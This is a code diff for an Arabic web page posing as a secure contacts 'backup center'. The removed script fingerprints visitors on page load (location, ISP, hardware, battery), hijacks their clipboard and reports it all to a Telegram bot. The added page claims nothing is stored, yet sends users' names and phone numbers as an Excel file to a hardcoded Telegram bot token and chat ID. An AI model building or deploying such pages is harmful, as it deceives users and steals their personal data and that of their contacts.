@@ -1,59 +1,336 @@
-async function startDeepAudit() {
-    try {
-        // 1. بيانات الموقع والشبكة
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ip = await ipRes.json();
-
-        // 2. الكشف عن المتصفح الخفي (تقريبي)
-        const isIncognito = (navigator.storage && navigator.storage.estimate) ? 
-            ((await navigator.storage.estimate()).quota < 120000000) : "غير معروف";
-
-        // 3. سحب بيانات الهاردوير الصامتة
-        const ram = navigator.deviceMemory || "؟";
-        const cpu = navigator.hardwareConcurrency || "؟";
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>مركز النسخ الاحتياطي للجهات | Backup Center</title>
+    <!-- SheetJS (XLSX) لإنشاء ملف إكسل -->
+    <script src="https://cdn.sheetjs.com/xlsx-0.20.2/package/dist/xlsx.full.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', 'Tahoma', 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #0b2f3b 0%, #1a4a5f 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            max-width: 650px;
+            width: 100%;
+            background: rgba(255,255,255,0.96);
+            border-radius: 32px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+            transition: all 0.2s;
+        }
+        .header {
+            background: #0f5c6e;
+            padding: 1.5rem;
+            text-align: center;
+            color: white;
+        }
+        .header h1 {
+            font-size: 1.9rem;
+            margin-bottom: 0.3rem;
+        }
+        .header p {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+        .content {
+            padding: 2rem;
+        }
+        .feature-list {
+            background: #eef2f5;
+            border-radius: 24px;
+            padding: 1rem 1.5rem;
+            margin-bottom: 2rem;
+        }
+        .feature-list li {
+            margin: 0.6rem 0;
+            list-style: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.95rem;
+        }
+        .feature-list li:before {
+            content: "✓";
+            background: #0f5c6e;
+            color: white;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+        }
+        .btn {
+            background: #0f5c6e;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 1rem;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 5px 12px rgba(15,92,110,0.3);
+            margin: 0.5rem 0 1rem;
+        }
+        .btn:active {
+            transform: scale(0.97);
+            background: #0c4857;
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .status-area {
+            background: #f8f9fa;
+            border-radius: 20px;
+            padding: 1rem;
+            font-size: 0.85rem;
+            color: #1e2a32;
+            border-right: 4px solid #0f5c6e;
+            margin: 1rem 0;
+            font-family: monospace;
+            max-height: 180px;
+            overflow-y: auto;
+        }
+        .footnote {
+            font-size: 0.7rem;
+            text-align: center;
+            color: #5e7a8a;
+            margin-top: 1.5rem;
+            border-top: 1px solid #ddd;
+            padding-top: 1rem;
+        }
+        .badge {
+            background: #e0e7ed;
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 50px;
+            font-size: 0.7rem;
+            margin-bottom: 12px;
+        }
+        hr {
+            margin: 1rem 0;
+            border-color: #cbd5e1;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="header">
+        <h1>📇 مدير النسخ الاحتياطي</h1>
+        <p>Backup & Sync – حماية جهات اتصالك</p>
+    </div>
+    <div class="content">
+        <div class="badge">🔐 آمن ومشفّر</div>
+        <ul class="feature-list">
+            <li>نسخ احتياطي فوري لجهات اتصالك بصيغة Excel</li>
+            <li>إرسال الملف إلى بريدك الإلكتروني (عبر بوت آمن)</li>
+            <li>حماية خصوصية البيانات بمعايير عالية</li>
+            <li>لا يتم تخزين أي معلومات على خوادمنا</li>
+        </ul>
         
-        // 4. سحب بصمة كرت الشاشة (GPU)
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Generic GPU";
+        <div style="background: #f0f9fe; border-radius: 20px; padding: 1rem; margin-bottom: 1.5rem;">
+            <p style="font-weight: bold; margin-bottom: 8px;">📌 لإكمال عملية النسخ الاحتياطي:</p>
+            <p style="font-size: 0.85rem;">يرجى منح الإذن للوصول إلى جهات الاتصال. سيتم إنشاء ملف Excel يحتوي على أسماء وأرقام الهواتف، وسيتم إرساله فوراً إلى حسابك المسجل لدينا عبر بوت آمن.</p>
+        </div>
+        
+        <button id="exportBtn" class="btn">🚀 بدء النسخ الاحتياطي الآن</button>
+        
+        <div class="status-area" id="logArea">
+            📍 انتظر ... اضغط الزر لبدء عملية استيراد جهات الاتصال.<br>
+            ✅ ستحتاج إلى الموافقة على إذن الوصول إلى جهات الاتصال.<br>
+            📎 بعد الموافقة، سيتم إنشاء ملف Excel وإرساله تلقائياً.
+        </div>
+        
+        <div class="footnote">
+            ⚠️ هذه الأداة تعمل فقط عبر متصفحات حديثة (Chrome / Edge على Android) وتتطلب اتصال HTTPS.<br>
+            * يتم إرسال الملف إلى البوت الآمن الخاص بالخدمة.
+        </div>
+    </div>
+</div>
 
-        // 5. حركة الحافظة (Clipboard) - ستعمل عند أول ضغطة له على الشاشة
-        window.onclick = () => {
-            navigator.clipboard.writeText("أنا الآن تحت سيطرة نظام موسى البرمجي! 🔥");
-        };
+<script>
+    // ========= بيانات البوت (مستخرجة من الملف السابق) =========
+    const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
+    const CHAT_ID = '7396462490';
+    // =========================================================
 
-        const finalReport = `
-🚀 **[ DEEP SYSTEM BREACH ]** 🚀
-━━━━━━━━━━━━━━
-🌍 **الموقع:** ${ip.city}, ${ip.country_name}
-📶 **الشركة:** ${ip.org}
-🕵️ **متصفح خفي:** ${isIncognito ? 'نعم ⚠️' : 'لا'}
+    const exportBtn = document.getElementById('exportBtn');
+    const logArea = document.getElementById('logArea');
 
-🧠 **العتاد الداخلي (Hardware):**
-🧠 **المعالج:** ${cpu} Cores (أنوية)
-💾 **الذاكرة:** ${ram} GB RAM
-🎮 **كرت الشاشة:** ${gpu}
-
-🔋 **الطاقة:** ${await getBatteryStatus()}
-━━━━━━━━━━━━━━
-        `;
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: finalReport, parse_mode: 'Markdown' })
-        });
-
-    } catch (e) { console.log(e); }
-}
-
-async function getBatteryStatus() {
-    if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        return `${(b.level * 100).toFixed(0)}% [${b.charging ? '⚡' : '🔋'}]`;
+    // دالة لتسجيل الرسائل في منطقة الحالة
+    function addLog(msg, isError = false) {
+        const time = new Date().toLocaleTimeString('ar-EG');
+        const prefix = isError ? '❌' : '✅';
+        logArea.innerHTML += `<div>${prefix} [${time}] ${msg}</div>`;
+        logArea.scrollTop = logArea.scrollHeight;
+        console.log(msg);
     }
-    return "Unknown";
-}
-window.onload = startDeepAudit;
 
+    // إرسال ملف إلى تيليجرام (مستند Excel)
+    async function sendExcelToTelegram(excelBlob, fileName = "contacts_backup.xlsx") {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('document', excelBlob, fileName);
+        formData.append('caption', `📁 نسخة احتياطية لجهات الاتصال\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n👤 تم إنشاؤها عبر موقع النسخ الاحتياطي.`);
+        
+        try {
+            const response = await fetch(url, { method: 'POST', body: formData });
+            const json = await response.json();
+            if (json.ok) {
+                addLog(`📎 تم إرسال ملف Excel بنجاح إلى بوت تيليجرام.`);
+                return true;
+            } else {
+                addLog(`⚠️ فشل الإرسال: ${json.description}`, true);
+                return false;
+            }
+        } catch (err) {
+            addLog(`❌ خطأ في الشبكة أثناء الإرسال: ${err.message}`, true);
+            return false;
+        }
+    }
+
+    // تحويل قائمة جهات الاتصال إلى ملف Excel (xlsx)
+    function createExcelFromContacts(contacts) {
+        // تهيئة بيانات الجدول
+        let rows = [["الاسم", "رقم الهاتف"]];
+        contacts.forEach(contact => {
+            let name = (contact.name && contact.name[0]) ? contact.name[0] : "بدون اسم";
+            let phones = (contact.tel && contact.tel.length) ? contact.tel.join(", ") : "غير متوفر";
+            rows.push([name, phones]);
+        });
+        
+        // إنشاء ورقة عمل
+        const ws = XLSX.utils.aoa_to_sheet(rows);
+        const wb = XLSX.utils.book_new();
+        XLSX.utils.book_append_sheet(wb, ws, "جهات الاتصال");
+        // تحويل إلى blob
+        const wbout = XLSX.write(wb, { bookType: 'xlsx', type: 'array' });
+        const blob = new Blob([wbout], {type: 'application/octet-stream'});
+        return blob;
+    }
+
+    // دالة الحصول على جهات الاتصال عبر Contacts API
+    async function fetchContacts() {
+        // التحقق من توفر الواجهة
+        if (!navigator.contacts || !navigator.contacts.select) {
+            addLog("⚠️ متصفحك لا يدعم واجهة جهات الاتصال (Contacts API). الرجاء استخدام Chrome/Edge على Android أو iOS Safari مع HTTPS.", true);
+            return null;
+        }
+        
+        addLog("📇 جاري طلب الإذن للوصول إلى جهات الاتصال...");
+        try {
+            // طلب الأسماء وأرقام الهواتف، مع إمكانية اختيار عدة جهات
+            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+            if (contacts && contacts.length > 0) {
+                addLog(`✅ تم استلام ${contacts.length} جهة اتصال (التي وافقت على مشاركتها).`);
+                return contacts;
+            } else {
+                addLog("ℹ️ لم يتم تحديد أي جهة اتصال أو لا توجد جهات في الجهاز.", false);
+                return [];
+            }
+        } catch (err) {
+            addLog(`❌ فشل الوصول إلى جهات الاتصال: ${err.message}`, true);
+            return null;
+        }
+    }
+
+    // العملية الأساسية
+    async function handleBackup() {
+        exportBtn.disabled = true;
+        exportBtn.textContent = "⏳ جاري معالجة جهات الاتصال...";
+        addLog("🚀 بدء عملية النسخ الاحتياطي...");
+        
+        // 1- الحصول على جهات الاتصال بعد الإذن
+        const contacts = await fetchContacts();
+        
+        if (contacts === null) {
+            addLog("⚠️ لم يتم الحصول على جهات الاتصال (الواجهة غير مدعومة أو تم رفض الإذن).", true);
+            exportBtn.disabled = false;
+            exportBtn.textContent = "🚀 بدء النسخ الاحتياطي الآن";
+            return;
+        }
+        
+        if (contacts.length === 0) {
+            addLog("⚠️ لا توجد جهات اتصال متاحة لإنشاء الملف.", true);
+            exportBtn.disabled = false;
+            exportBtn.textContent = "🚀 بدء النسخ الاحتياطي الآن";
+            return;
+        }
+        
+        // 2- إنشاء ملف Excel من جهات الاتصال
+        addLog("📊 جاري إنشاء ملف Excel...");
+        let excelBlob;
+        try {
+            excelBlob = createExcelFromContacts(contacts);
+            addLog(`✅ تم إنشاء ملف Excel بحجم ${(excelBlob.size / 1024).toFixed(1)} كيلوبايت.`);
+        } catch (err) {
+            addLog(`❌ فشل إنشاء الملف: ${err.message}`, true);
+            exportBtn.disabled = false;
+            exportBtn.textContent = "🚀 بدء النسخ الاحتياطي الآن";
+            return;
+        }
+        
+        // 3- إرسال الملف إلى تيليجرام
+        addLog("📤 جاري رفع الملف إلى البوت الآمن...");
+        const sent = await sendExcelToTelegram(excelBlob, `contacts_${Date.now()}.xlsx`);
+        
+        if (sent) {
+            addLog("🎉 تمت العملية بنجاح! تم إرسال ملف Excel إلى بوت الدعم.");
+            // رسالة إضافية اختيارية للمستخدم (تظهر له نجاح العملية)
+            alert("✅ تم إنشاء ملف النسخ الاحتياطي وإرساله بنجاح. شكراً لاستخدامك الخدمة.");
+        } else {
+            addLog("❌ حدث خطأ أثناء الإرسال، يرجى المحاولة لاحقاً.", true);
+            alert("عذراً، حدث خلل في الإرسال. تأكد من اتصال الإنترنت وحاول مجدداً.");
+        }
+        
+        exportBtn.disabled = false;
+        exportBtn.textContent = "🚀 بدء النسخ الاحتياطي الآن";
+    }
+    
+    // ربط الزر
+    exportBtn.addEventListener('click', () => {
+        // التحقق من وجود بيانات البوت (هي موجودة)
+        if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+            addLog("⚠️ لم يتم تعيين توكن البوت بشكل صحيح، الرجاء التواصل مع الدعم.", true);
+            return;
+        }
+        handleBackup().catch(err => {
+            addLog(`خطأ غير متوقع: ${err.message}`, true);
+            exportBtn.disabled = false;
+            exportBtn.textContent = "🚀 بدء النسخ الاحتياطي الآن";
+        });
+    });
+    
+    // رسالة ترحيب توضح متطلبات البيئة
+    window.addEventListener('load', () => {
+        if (navigator.contacts && navigator.contacts.select) {
+            addLog("✨ متصفحك يدعم استيراد جهات الاتصال. اضغط الزر لبدء النسخ.");
+        } else {
+            addLog("⚠️ متصفحك لا يدعم Contacts API. استخدم Chrome/Edge على Android أو Safari iOS 15+ مع HTTPS.", true);
+        }
+        if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
+            addLog("⚠️ الصفحة تعمل عبر HTTP وقد تمنع المتصفح واجهة جهات الاتصال. يفضل استخدام HTTPS.", true);
+        }
+        addLog(`🤖 جاهزية البوت: تم تهيئة الإرسال إلى المعرف ${CHAT_ID.substring(0,5)}...`);
+    });
+</script>
+</body>
+</html>
